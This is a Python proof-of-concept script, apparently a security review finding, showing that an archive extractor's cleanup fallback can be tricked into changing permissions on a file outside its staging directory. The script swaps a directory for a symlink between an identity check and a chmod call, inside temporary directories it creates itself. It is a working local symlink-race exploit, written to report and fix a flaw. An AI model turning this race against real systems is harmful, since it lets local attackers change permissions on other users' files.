"""P1: EXT-4 Cleanup "Restrictive modes" fallback follows a swapped-in symlink outside staging.

A spec-literal skeleton on Linux, run as one user. The "attacker" steps are hooks that do what
another local user could do once staging has its final permissions (0755 & ~umask) and a stored
directory mode of 0o777 (§12.6) makes a directory inside staging writable by everyone.

Sequence, per FORMAT_SPEC §12.6 and §15 EXT-4:
  1. staging: mkdirat 0700, openat O_DIRECTORY|O_NOFOLLOW, fstat checks (Holding it).
  2. write the tree: d/ and d/x/ (with a file in x).
  3. §12.6: directory modes applied after all entries, reverse canonical order: d/x -> 0o077, d -> 0o777.
  4. Final permissions on staging through its handle: 0755 & ~umask.
  5. A parent-writer created the destination meanwhile: renameat2(RENAME_NOREPLACE) -> EEXIST ->
     refused/extract.dest-exists, cleanup applies.
  6. Cleanup, Restrictive modes, for d/x (no handle held to x, since a 0o077 dir can't be opened):
     fchmodat(d_fd, "x", NOFOLLOW).
       - rustix 1.1.4 (the approved dependency, D15) returns EOPNOTSUPP for that flag on Linux,
         always (src/backend/linux_raw/fs/syscalls.rs:130).
       - glibc returns EOPNOTSUPP when the name is a symlink (shown below), so an attacker can
         force the fallback even where the flag is supported.
     Fallback: fstatat(d_fd, "x", NOFOLLOW) is the recorded directory -> fchmodat without the flag.
     ATTACK: between those two calls, exchange d/x with a symlink to an outside file.
"""
import ctypes, ctypes.util, os, stat, sys, tempfile, errno

libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
AT_FDCWD, AT_SYMLINK_NOFOLLOW = -100, 0x100
SYS_renameat2 = 316          # x86_64
RENAME_NOREPLACE, RENAME_EXCHANGE = 1, 2

def renameat2(ofd, old, nfd, new, flags):
    r = libc.syscall(SYS_renameat2, ofd, old.encode(), nfd, new.encode(), flags)
    if r != 0:
        e = ctypes.get_errno(); raise OSError(e, os.strerror(e))

def glibc_fchmodat(dfd, name, mode, flags):
    r = libc.fchmodat(dfd, name.encode(), mode, flags)
    return 0 if r == 0 else ctypes.get_errno()

def rustix_chmodat(dfd, name, mode, flags):
    # rustix 1.1.4 linux backends: `if flags == AtFlags::SYMLINK_NOFOLLOW { return Err(OPNOTSUPP) }`
    if flags == AT_SYMLINK_NOFOLLOW: return errno.EOPNOTSUPP
    return glibc_fchmodat(dfd, name, mode, 0)

def run(backend, attack):
    root = tempfile.mkdtemp(dir=os.path.dirname(os.path.abspath(__file__)), prefix='p1-')
    parent = os.path.join(root, 'parent'); os.mkdir(parent, 0o755)
    outside = os.path.join(root, 'outside'); os.mkdir(outside, 0o755)
    victim = os.path.join(outside, 'victim.txt'); open(victim, 'w').write('secret\n'); os.chmod(victim, 0o600)
    pfd = os.open(parent, os.O_RDONLY | os.O_DIRECTORY)
    # 1. Holding it
    sname = '.out.chst-' + os.urandom(16).hex()
    os.mkdir(sname, 0o700, dir_fd=pfd)
    sfd = os.open(sname, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW, dir_fd=pfd)
    st = os.fstat(sfd)
    assert stat.S_ISDIR(st.st_mode) and st.st_uid == os.geteuid() and stat.S_IMODE(st.st_mode) == 0o700 and not os.listdir(sfd)
    recorded = {}
    # 2. tree
    os.mkdir('d', 0o755, dir_fd=sfd); dfd = os.open('d', os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW, dir_fd=sfd)
    recorded['d'] = os.stat('d', dir_fd=sfd, follow_symlinks=False)[1:3]
    os.mkdir('x', 0o755, dir_fd=dfd); xfd = os.open('x', os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW, dir_fd=dfd)
    recorded['d/x'] = os.stat('x', dir_fd=dfd, follow_symlinks=False)[1:3]
    ffd = os.open('f', os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_NOFOLLOW, 0o644, dir_fd=xfd); os.write(ffd, b'hi'); os.close(ffd)
    os.close(xfd)    # 0o077 below: the directory can't be reopened by its owner, so no handle is kept
    # 3. stored directory modes, reverse canonical order
    os.chmod('x', 0o077, dir_fd=dfd); os.fchmod(dfd, 0o777)
    # 4. final permissions
    um = os.umask(0); os.umask(um); os.fchmod(sfd, 0o755 & ~um)
    print(f'  [{backend}, attack={attack}] at cleanup: staging {oct(stat.S_IMODE(os.fstat(sfd).st_mode))}, '
          f'd {oct(stat.S_IMODE(os.fstat(dfd).st_mode))} -> any local user can search staging and rename names inside d')
    # 5. parent-writer creates the destination; no-replace rename fails
    os.mkdir(os.path.join(parent, 'out'))
    try: renameat2(pfd, sname, pfd, 'out', RENAME_NOREPLACE); raise SystemExit('rename unexpectedly succeeded')
    except OSError as e: assert e.errno == errno.EEXIST
    # attacker prepares a symlink next to x
    os.symlink(victim, 'lnk', dir_fd=dfd)
    chmodat = rustix_chmodat if backend == 'rustix' else glibc_fchmodat
    # 6. cleanup: restore owner rwx on d/x
    if attack and backend == 'glibc':
        renameat2(dfd, 'x', dfd, 'lnk', RENAME_EXCHANGE)        # x is now the symlink -> NOFOLLOW gives EOPNOTSUPP
    st_before = None
    rc = chmodat(dfd, 'x', 0o700, AT_SYMLINK_NOFOLLOW)
    if attack and backend == 'glibc':
        renameat2(dfd, 'x', dfd, 'lnk', RENAME_EXCHANGE)        # swap back before the identity check
    print(f'    fchmodat(d, "x", AT_SYMLINK_NOFOLLOW) -> {errno.errorcode.get(rc, rc) if rc else "ok"}')
    if rc in (errno.EOPNOTSUPP, errno.ENOTSUP):
        s = os.stat('x', dir_fd=dfd, follow_symlinks=False)
        assert stat.S_ISDIR(s.st_mode) and (s.st_ino, s.st_dev) == recorded['d/x'], 'identity check'
        print(f'    fallback: fstatat NOFOLLOW sees the recorded directory, mode {oct(stat.S_IMODE(s.st_mode))}')
        if attack:
            renameat2(dfd, 'x', dfd, 'lnk', RENAME_EXCHANGE)    # ATTACK between check and use
        newmode = stat.S_IMODE(s.st_mode) | 0o700              # "restores the owner's read, write and search"
        rc2 = glibc_fchmodat(dfd, 'x', newmode, 0)
        print(f'    fchmodat(d, "x", {oct(newmode)}) without the flag -> {"ok" if rc2 == 0 else errno.errorcode[rc2]}')
    vm = stat.S_IMODE(os.stat(victim).st_mode)
    print(f'    outside file {victim}: mode {oct(vm)}  ->  {"MODIFIED OUTSIDE STAGING" if vm != 0o600 else "unchanged"}')
    # tidy up
    os.system(f'chmod -R u+rwx "{root}" 2>/dev/null; rm -rf "{root}"')
    return vm != 0o600

print('glibc fchmodat(AT_SYMLINK_NOFOLLOW) probe (kernel', os.uname().release + '):')
t = tempfile.mkdtemp(dir=os.path.dirname(os.path.abspath(__file__)), prefix='p1probe-')
tfd = os.open(t, os.O_RDONLY | os.O_DIRECTORY); os.mkdir('dir', dir_fd=tfd); os.symlink('dir', 'sym', dir_fd=tfd)
for n in ('dir', 'sym'):
    rc = glibc_fchmodat(tfd, n, 0o700, AT_SYMLINK_NOFOLLOW); print(f'  on a {n}: {errno.errorcode.get(rc) if rc else "ok"}')
os.system(f'rm -rf "{t}"')
res = {}
for backend in ('rustix', 'glibc'):
    for attack in (False, True):
        res[(backend, attack)] = run(backend, attack)
print('outside file modified:', res)
